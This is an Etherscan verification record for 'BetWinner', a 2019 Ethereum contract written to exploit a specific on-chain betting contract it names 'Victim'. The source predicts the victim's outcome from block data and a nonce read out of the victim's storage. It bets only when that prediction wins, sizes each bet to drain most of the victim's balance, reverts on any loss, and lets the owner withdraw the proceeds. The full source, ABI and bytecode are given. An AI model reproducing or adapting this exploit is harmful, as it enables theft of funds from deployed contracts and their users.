{
  "address": "0x92802ab3d5b3c3f18a9e9a738b36bb9daadb40af",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "BetWinner",
  "compilerVersion": "v0.5.1+commit.c8a2cb62",
  "optimization": false,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-04-10\n*/\n\ncontract Victim {\n    function doBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply) public payable returns (bytes32 queryId);\n}\n\n\ncontract BetWinner {\n    uint randonce;\n\taddress payable owner;\n\tVictim victim;\n\t\n\tconstructor(Victim v) public {\n\t\towner = msg.sender;\n\t\tvictim = v;\n\t}\n\t\n\tfunction () payable external {\n\t}\n\n\tmodifier onlyOwner() {\n\t\trequire(msg.sender == owner);\n\t\t_;\n\t}\n\t\n\t//\n\t// w3.eth.getStorageAt(\"0x77F54E6a0ED49e8Ce5155468FeAEC29368B10465\",7)\n\t//\n\tfunction setNonce(uint nonce) external onlyOwner {\n\t\trandonce = nonce;\n\t}\n\t\n\tfunction getMaxBet() public view onlyOwner returns (uint) {\n\t    return address(victim).balance * 80 / 100 * 10 / 19 - 1000;\n\t}\n\t\n\tfunction  doBet(uint weiValOverride) payable external onlyOwner {\n\t    uint weiVal = weiValOverride;\n\t    if (weiVal == 0) {\n\t        weiVal = getMaxBet();\n\t    }\n\t\t\n\t\tuint before = address(this).balance;\n\t\t\n\t    (uint betInfo, uint randonceNew) = getBet(randonce);\n\t\t\n\t\tif (betInfo != 2) {\n\t\t\t// call victim\n\t\t\tuint[] memory playid = new uint[](1);\n\t\t\tplayid[0] = betInfo;\n\t\t\t\n\t\t\tuint[] memory betMoney = new uint[](1);\n\t\t\tbetMoney[0] = weiVal;\n\t\t\t\n\t\t\tuint[] memory betContent = new uint[](1);\n\t\t\tbetContent[0] = betInfo;\n\t\t\tvictim.doBet.value(weiVal)(playid, betMoney, betContent,1);\n\t\t\t\n\t\t\tuint post = address(this).balance;\n\t\t\trequire(before < post, \"Sanity check\");\n    \t    randonce = randonceNew;\n\t\t}\n\n\t}\n\t\n    function getBet(uint randonce) public view onlyOwner returns (uint betInfo, uint randonceNew)  {\n\t\tuint[4] memory codes = [uint(0),0,0,0];//Winning numbers\n\n\t\tbytes32 code0hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\n\t\trandonce  = randonce + uint(code0hash)%1000;\n\t\tcodes[0] = uint(code0hash) % 52 + 1;\n\n\t\tbytes32 code1hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\n\t\trandonce  = randonce + uint(code1hash)%1000;\n\t\tcodes[1] = uint(code1hash) % 52 + 1;\n\n\t\tbytes32 code2hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\n\t\trandonce  = randonce + uint(code2hash)%1000;\n\t\tcodes[2] = uint(code2hash) % 52 + 1;\n\n\t\tbytes32 code3hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\n\t\trandonce  = randonce + uint(code3hash)%1000;\n\t\tcodes[3] = uint(code3hash) % 52 + 1;\n\n\t\t// check winner\n\t\tuint code0 = codes[0]%13==0?13:codes[0]%13;\n\t\tuint code1 = codes[1]%13==0?13:codes[1]%13;\n\t\tuint code2 = codes[2]%13==0?13:codes[2]%13;\n\t\tuint code3 = codes[3]%13==0?13:codes[3]%13;\n\t\tuint  onecount = code0 + code2;\n\t\tuint  twocount = code1 + code3;\n\t\tonecount = onecount%10;\n\t\ttwocount = twocount%10;\n\t\t  \n\t\tbetInfo = 2;\n\t\tif(onecount > twocount){\n\t\t\tbetInfo = 1;\n\t\t} else if (onecount < twocount){\n\t\t\tbetInfo = 3;\n\t\t}\n\t\treturn (betInfo, randonce);\n    }\n\t\n\tfunction withdraw() external onlyOwner{\n\t\towner.transfer((address(this).balance));\n\t}\n\n\n}",
  "abi": "[{\"constant\":true,\"inputs\":[{\"name\":\"randonce\",\"type\":\"uint256\"}],\"name\":\"getBet\",\"outputs\":[{\"name\":\"betInfo\",\"type\":\"uint256\"},{\"name\":\"randonceNew\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMaxBet\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"weiValOverride\",\"type\":\"uint256\"}],\"name\":\"doBet\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"nonce\",\"type\":\"uint256\"}],\"name\":\"setNonce\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"v\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]",
  "bytecode": "608060405234801561001057600080fd5b50604051602080610dd18339810180604052602081101561003057600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610cfe806100d36000396000f3fe608060405260043610610067576000357c010000000000000000000000000000000000000000000000000000000090048063061e494f146100695780633ccfd60b146100bf578063646668b6146100d6578063b8a1e35514610101578063f360c1831461012f575b005b34801561007557600080fd5b506100a26004803603602081101561008c57600080fd5b810190808035906020019092919050505061016a565b604051808381526020018281526020019250505060405180910390f35b3480156100cb57600080fd5b506100d46106b6565b005b3480156100e257600080fd5b506100eb610794565b6040518082815260200191505060405180910390f35b61012d6004803603602081101561011757600080fd5b8101908080359060200190929190505050610853565b005b34801561013b57600080fd5b506101686004803603602081101561015257600080fd5b8101908080359060200190929190505050610c49565b005b600080600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156101c957600080fd5b6101d1610caf565b6080604051908101604052806000815260200160008152602001600081526020016000815250905060006001430340423087604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c010000000000000000000000000281526014018281526020019450505050506040516020818303038152906040528051906020012090506103e8816001900481151561028c57fe5b06850194506001603482600190048115156102a357fe5b06018260006004811015156102b457fe5b60200201818152505060006001430340423088604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c010000000000000000000000000281526014018281526020019450505050506040516020818303038152906040528051906020012090506103e8816001900481151561035057fe5b068601955060016034826001900481151561036757fe5b060183600160048110151561037857fe5b60200201818152505060006001430340423089604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c010000000000000000000000000281526014018281526020019450505050506040516020818303038152906040528051906020012090506103e8816001900481151561041457fe5b068701965060016034826001900481151561042b57fe5b060184600260048110151561043c57fe5b6020020181815250506000600143034042308a604051602001808581526020018481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c010000000000000000000000000281526014018281526020019450505050506040516020818303038152906040528051906020012090506103e881600190048115156104d857fe5b06880197506001603482600190048115156104ef57fe5b060185600360048110151561050057fe5b602002018181525050600080600d87600060048110151561051d57fe5b602002015181151561052b57fe5b061461055657600d86600060048110151561054257fe5b602002015181151561055057fe5b06610559565b600d5b9050600080600d88600160048110151561056f57fe5b602002015181151561057d57fe5b06146105a857600d87600160048110151561059457fe5b60200201518115156105a257fe5b066105ab565b600d5b9050600080600d8960026004811015156105c157fe5b60200201518115156105cf57fe5b06146105fa57600d8860026004811015156105e657fe5b60200201518115156105f457fe5b066105fd565b600d5b9050600080600d8a600360048110151561061357fe5b602002015181151561062157fe5b061461064c57600d89600360048110151561063857fe5b602002015181151561064657fe5b0661064f565b600d5b90506000828501905060008285019050600a8281151561066b57fe5b069150600a8181151561067a57fe5b06905060029c50808211156106925760019c506106a0565b8082101561069f5760039c505b5b8c8e9c509c505050505050505050505050915091565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561071257600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610791573d6000803e3d6000fd5b50565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156107f257600080fd5b6103e86013600a60646050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16310281151561084157fe5b040281151561084c57fe5b0403905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156108af57600080fd5b600081905060008114156108c8576108c5610794565b90505b60003073ffffffffffffffffffffffffffffffffffffffff163190506000806108f260005461016a565b91509150600282141515610c4257606060016040519080825280602002602001820160405280156109325781602001602082028038833980820191505090505b5090508281600081518110151561094557fe5b9060200190602002018181525050606060016040519080825280602002602001820160405280156109855781602001602082028038833980820191505090505b5090508581600081518110151561099857fe5b9060200190602002018181525050606060016040519080825280602002602001820160405280156109d85781602001602082028038833980820191505090505b509050848160008151811015156109eb57fe5b9060200190602002018181525050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fc2234108885858560016040518663ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180806020018060200180602001858152602001848103845288818151815260200191508051906020019060200280838360005b83811015610ab9578082015181840152602081019050610a9e565b50505050905001848103835287818151815260200191508051906020019060200280838360005b83811015610afb578082015181840152602081019050610ae0565b50505050905001848103825286818151815260200191508051906020019060200280838360005b83811015610b3d578082015181840152602081019050610b22565b505050509050019750505050505050506020604051808303818588803b158015610b6657600080fd5b505af1158015610b7a573d6000803e3d6000fd5b50505050506040513d6020811015610b9157600080fd5b81019080805190602001909291905050505060003073ffffffffffffffffffffffffffffffffffffffff163190508087101515610c36576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600c8152602001807f53616e69747920636865636b000000000000000000000000000000000000000081525060200191505060405180910390fd5b84600081905550505050505b5050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610ca557600080fd5b8060008190555050565b60806040519081016040528060049060208202803883398082019150509050509056fea165627a7a72305820117216b87f36316ef86adb981440a345ae1f2d52d06a22f08547f5f54a3ca98a002900000000000000000000000077f54e6a0ed49e8ce5155468feaec29368b10465",
  "constructorArguments": "00000000000000000000000077F54E6a0ED49e8Ce5155468FeAEC29368B10465"
}